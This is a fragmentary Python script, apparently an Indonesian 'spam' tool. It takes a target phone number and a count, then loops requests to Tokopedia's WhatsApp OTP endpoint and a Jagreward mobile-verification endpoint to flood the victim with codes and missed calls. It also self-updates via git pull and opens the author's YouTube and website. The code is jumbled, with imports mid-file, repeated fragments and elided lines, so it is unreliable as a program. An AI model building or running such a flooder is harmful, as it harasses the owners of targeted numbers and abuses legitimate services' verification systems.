...
def mr_dark_nutric():
  ...
  if json.loads(darkreq.text)["StatusMessage"] == 'Request misscall berhasil':
       ...
       time.sleep(30)
def mr_dark_jag():
  dark_request = requests.get("https://id.jagreward.com/member/verify-mobile/"+ibnugantengnom)
...
def mr_x():
    time.sleep(1)
    os.system("clear")
    print ("\033[1;37m[\033[1;30m1\033[1;37m] \033[36m Subrek Yt \033[1;37mIbnustayt \033[36m cuy :v")
    time.sleep(1)
    os.system("xdg-open https://www.youtube.com/channel/UCsFJJtn_m2PQL4NGLw9682A")
    time.sleep(3)
    print ("\033[1;37m[\033[1;30m2\033[1;37m] \033[36m Kunjungi \033[1;37mWeb saia \033[36m cuy :v")
    time.sleep(1)
    os.system("xdg-open https://ibnusta.com/")
    time.sleep(3)
    os.system("clear")
# -------{ bang give alok bang :V }-------- #
def mr_dark_input():
    subs_ibnustayt = input("   \033[1;37m\033[31m➤ \033[36m")
    if subs_ibnustayt == "1":
         dark_point = 1
         ...
         ibnusta_ganteng = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = dark_user, data = mr_dark_to_the_moon).text
         print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37mSTATUS \033[1;33m• \033[0m\033[1;30m]══════════════>")
         for i in range(int(jumlah)):
             if 'Anda sudah melakukan 3 kali pengiriman kode' in ibnusta_ganteng:
                  ...
                  time.sleep(5)
                  dark_point += 1
    elif subs_ibnustayt == "2":
         dark_point = 1
         print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37mRUNNING \033[1;33m• \033[0m\033[1;30m]══════════════>")
         ibnugantengnom = input("   \033[1;37m[\033[1;35m#\033[1;37m] No Target: \033[36m0")
         no = ("0"+ibnugantengnom)
         jumlah = int(input("   \033[1;37m[\033[1;35m#\033[1;37m] Jumlah: \033[36m"))
         hd = {
         ...
         for i in range(int(jumlah)):
             ...
             if 'Anda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini.' in dark_request:
                  print (f"   \033[1;37m[\033[1;32m{dark_point}\033[1;37m] \033[1;32mTerkirim \033[31m")
                  time.sleep(30)
                  dark_point += 1import os,sys,time,requests,json,random,re
from requests import post
from requests import get
# -------{ Di sini saia memanggil git pull untuk otamatis ke update jika ada pembaruan }-------- #
os.system("git pull")
    ...
    if subs_ibnustayt == "1":
         ...
         for i in range(int(jumlah)):
             ...
             if 'Anda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini.' in dark_request:
                  ...
                  time.sleep(30)
                  dark_point += 1
    elif subs_ibnustayt == "4":
         os.system("xdg-open https://ibnusta.com")
         print ("")
    else:
         time.sleep(2)
         print ("\033[1;37m[\033[31m•\033[1;37m] Command: "+subs_ibnustayt+" not found")
         time.sleep(3)
         os.system("clear")
         banner_anjay_subs_ibnustayt()
def banner_anjay_subs_ibnustayt():


    print ("   \033[36m╔═╗\033[1;37m┌─┐┌─┐┌┬┐     \033")
    print ("   \033[36m╚═╗\033[1;37m├─┘├─┤│││ \033[31;")
    print ("   \033[36m╚═╝\033[1;37m┴  ┴ ┴┴ ┴     \033")
    print ("")
    print ("    \033[1;37m\033[31m>\033[1;37m Author\033[31m:\033[1;37m\033[1;37m Ibnustagnz ")
    print ("    \033[1;37m\033[31m>\033[1;37m Website\033[31m:\033[1;37m\033[1;37m www.ibnusta.com")
    print ("")
